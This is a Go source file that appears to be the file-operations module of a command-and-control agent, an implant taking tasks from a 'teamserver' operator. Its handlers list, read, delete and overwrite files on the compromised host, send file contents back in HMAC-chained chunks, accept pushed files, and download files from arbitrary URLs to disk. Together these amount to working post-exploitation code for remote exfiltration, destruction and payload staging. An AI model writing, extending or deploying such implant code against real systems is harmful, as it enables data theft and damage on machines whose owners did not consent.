//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"bytes"
	"crypto/hmac"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"unicode/utf8"
)

func handleLS(task Task, res *TaskResult) {
	path := task.Path
	if path == "" {
		path = task.Command
	}
	out, err := listDirectory(path)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
		res.Encoding = "base64"
		res.Path = path
	}
}

func handleDelete(task Task, res *TaskResult) {
	path := task.Path
	if path == "" {
		path = task.Command
	}
	err := deleteFileOrDir(path)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = "Deleted: " + path
		res.Path = path
	}
}

func handleRead(task Task, res *TaskResult) {
	path := task.Path
	if path == "" {
		path = task.Command
	}
	data, err := readFileContent(path)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString(data)
		res.Encoding = "base64"
		res.Path = path
		res.Size = int64(len(data))
		res.SHA256 = sha256Hex(data)
		if fi, statErr := os.Stat(path); statErr == nil {
			res.Mtime = fi.ModTime().Unix()
		}
	}
}

func handleDownload(task Task, res *TaskResult) {
	if task.TransferID != nil {
		handleTransferTask(task, res)
		return
	}
	if strings.HasPrefix(strings.ToLower(task.Command), "http") {
		dest := task.Shell
		if dest == "" {
			dest = task.Path
		}
		if dest == "" {
			dest = task.Command[strings.LastIndex(task.Command, "/")+1:]
		}
		if err := downloadFromURL(task.Command, dest); err != nil {
			res.Error = err.Error()
		} else {
			res.Output = "Downloaded to: " + dest
			res.Path = dest
		}
	} else {
		path := task.Path
		if path == "" {
			path = task.Command
		}
		offset := task.Offset
		size := task.Size
		if size == 0 {
			size = 1024 * 1024
		}
		data, err := downloadFileChunk(path, offset, size)
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = base64.StdEncoding.EncodeToString(data)
			res.Encoding = "base64"
			res.Path = path
			res.Offset = offset
			res.Size = int64(len(data))
			res.Filename = filepath.Base(path)
			// Integrity chain: mac = HMAC(chainKey, prevMAC || chunk). The
			// server verifies this link before committing the chunk to disk.
			mac := fileChunkMAC(fileChainKey(), chainPrev(task.ID), data)
			res.MAC = hex.EncodeToString(mac)
			chainCommit(task.ID, mac)
		}
	}
}

func handleUpload(task Task, res *TaskResult) {
	if task.TransferID != nil {
		handleTransferTask(task, res)
		return
	}
	path := task.Path
	if path == "" {
		path = task.Command
	}
	offset := task.Offset
	if task.Data != "" || task.Shell != "" {
		b64 := task.Data
		if b64 == "" {
			b64 = task.Shell
		}
		// Push path: the chunk is HMAC-signed by the server; refuse to write
		// unless the signature verifies over the previous chain link.
		err := uploadFileChunk(task.ID, path, offset, b64, task.PrevMAC, task.MAC)
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = "File chunk uploaded successfully"
			res.Path = path
			res.Offset = offset
		}
	} else {
		size := task.Size
		if size == 0 {
			size = 1024 * 1024
		}
		data, err := downloadFileChunk(path, offset, size)
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = base64.StdEncoding.EncodeToString(data)
			res.Encoding = "base64"
			res.Path = path
			res.Offset = offset
			res.Size = int64(len(data))
			res.Filename = filepath.Base(path)
			mac := fileChunkMAC(fileChainKey(), chainPrev(task.ID), data)
			res.MAC = hex.EncodeToString(mac)
			chainCommit(task.ID, mac)
		}
	}
}

// handleTransferTask honours the explicit direction carried by a durable
// transfer session. It never infers direction from an empty Data field.
func handleTransferTask(task Task, res *TaskResult) {
	switch task.Direction {
	case "pull":
		handleDurablePull(task, res)
	case "push":
		handleDurablePush(task, res)
	default:
		res.Error = fmt.Sprintf("unsupported transfer direction %q", task.Direction)
	}
}

// handleDurablePull reads one chunk from the remote file and reports the
// per-chunk digest and chain MAC. The server's committed PrevMAC is the only
// chain seed, so a restarted teamserver cannot lose continuity.
func handleDurablePull(task Task, res *TaskResult) {
	path := task.Path
	if path == "" {
		path = task.Command
	}
	prev, err := decodeTransferPrevMAC(task.PrevMAC)
	if err != nil {
		res.Error = err.Error()
		return
	}
	size := task.Size
	if size <= 0 {
		size = transferChunkSize
	}
	if size > maxDownloadChunkSize {
		size = maxDownloadChunkSize
	}
	data, err := downloadFileChunk(path, task.Offset, size)
	if err != nil {
		res.Error = err.Error()
		return
	}
	final := task.Final
	if !final {
		if fi, statErr := os.Stat(path); statErr == nil && task.Offset+int64(len(data)) >= fi.Size() {
			final = true
		}
	}
	mac := fileChunkMAC(fileChainKey(), prev, data)
	res.Output = base64.StdEncoding.EncodeToString(data)
	res.Encoding = "base64"
	res.Path = path
	res.Offset = task.Offset
	res.Size = int64(len(data))
	res.Filename = filepath.Base(path)
	res.MAC = hex.EncodeToString(mac)
	res.SHA256 = sha256Hex(data)
	res.Final = final
}

// handleDurablePush verifies the server-signed chunk before writing it at the
// requested offset and acknowledges the same chain link the server computes.
func handleDurablePush(task Task, res *TaskResult) {
	path := task.Path
	if path == "" {
		path = task.Command
	}
	prev, err := decodeTransferPrevMAC(task.PrevMAC)
	if err != nil {
		res.Error = err.Error()
		return
	}
	b64 := task.Data
	if b64 == "" {
		b64 = task.Shell
	}
	data, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		res.Error = fmt.Sprintf("base64 decode failed: %v", err)
		return
	}
	if len(data) > transferChunkSize {
		res.Error = fmt.Sprintf("chunk too large (%d bytes, max %d)", len(data), transferChunkSize)
		return
	}
	mac := fileChunkMAC(fileChainKey(), prev, data)
	if task.MAC != "" {
		want, decErr := hex.DecodeString(task.MAC)
		if decErr != nil || len(want) != 32 {
			res.Error = "malformed chain MAC"
			return
		}
		if !hmac.Equal(mac, want) {
			res.Error = "chunk HMAC mismatch (tampered/reordered data)"
			return
		}
	}
	if err := writeChunkAt(path, task.Offset, data); err != nil {
		res.Error = err.Error()
		return
	}
	// The server rebuilds the pushed file digest from acknowledged chunk
	// bytes, so the result must echo the base64 chunk, not a text summary.
	res.Output = b64
	res.Encoding = "base64"
	res.Path = path
	res.Offset = task.Offset
	res.Size = int64(len(data))
	res.Final = task.Final
	res.SHA256 = sha256Hex(data)
	res.MAC = hex.EncodeToString(mac)
}

// handleWrite implements the remote text editor's compare-and-swap write.
// Secrets are never accepted inline: the operator submits an edit baseline and
// the agent verifies the existing bytes before replacing them.
func handleWrite(task Task, res *TaskResult) {
	path := task.Command
	if path == "" {
		path = task.Path
	}
	if len(task.ExpectedSHA256) != 64 {
		res.Error = "expected_sha256 must be 64 hex characters"
		return
	}
	if _, err := hex.DecodeString(task.ExpectedSHA256); err != nil {
		res.Error = "expected_sha256 must be 64 hex characters"
		return
	}
	data, err := base64.StdEncoding.DecodeString(task.Data)
	if err != nil {
		res.Error = fmt.Sprintf("base64 decode failed: %v", err)
		return
	}
	if len(data) > maxEditorFileSize {
		res.Error = fmt.Sprintf("file too large (%d bytes, max %d)", len(data), maxEditorFileSize)
		return
	}
	if bytes.IndexByte(data, 0) >= 0 || !utf8.Valid(data) {
		res.Error = "file content must be UTF-8 without NUL bytes"
		return
	}
	if task.MAC != "" {
		prev, prevErr := decodeTransferPrevMAC(task.PrevMAC)
		if prevErr != nil {
			res.Error = prevErr.Error()
			return
		}
		want, macErr := hex.DecodeString(task.MAC)
		if macErr != nil || len(want) != 32 {
			res.Error = "malformed chain MAC"
			return
		}
		if !hmac.Equal(fileChunkMAC(fileChainKey(), prev, data), want) {
			res.Error = "chunk HMAC mismatch (tampered/reordered data)"
			return
		}
	}
	newHash, mtime, err := writeFileCAS(path, task.ExpectedSHA256, data)
	if err != nil {
		if errors.Is(err, errFileConflict) {
			res.Error = "file_conflict"
		} else {
			res.Error = err.Error()
		}
		return
	}
	res.Output = base64.StdEncoding.EncodeToString(data)
	res.Encoding = "base64"
	res.Path = path
	res.Size = int64(len(data))
	res.SHA256 = newHash
	res.Mtime = mtime
}
